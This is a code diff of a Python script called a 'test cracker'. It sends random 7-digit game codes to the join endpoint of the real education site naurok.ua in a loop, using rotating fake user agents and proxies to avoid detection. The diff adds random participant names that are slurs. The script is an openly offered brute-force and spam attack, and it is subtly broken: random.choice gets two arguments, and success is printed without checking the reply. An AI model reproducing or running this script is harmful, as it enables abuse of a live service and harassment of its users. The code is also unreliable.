@@ -13,11 +13,12 @@ console.print('''взломщик тестов
 
 for i in range(999):
     kod = ''
+    im=random.choice('daun','eblan')
     for i in range(7):
         kod = str(random.choice('1234567890') + kod)
     headers = {"UserAgent": fake_useragent.UserAgent().random}
     try:
-        requests.post("https://naurok.ua/test/join", data={"phone": kod}, headers=headers, proxies=proxies)
+        requests.post("https://naurok.ua/test/join", json={"joinform[gamecode]": kod, "joinform[name]": im}, headers=headers, proxies=proxies)
         print('мае')
     except:
         print('немае')
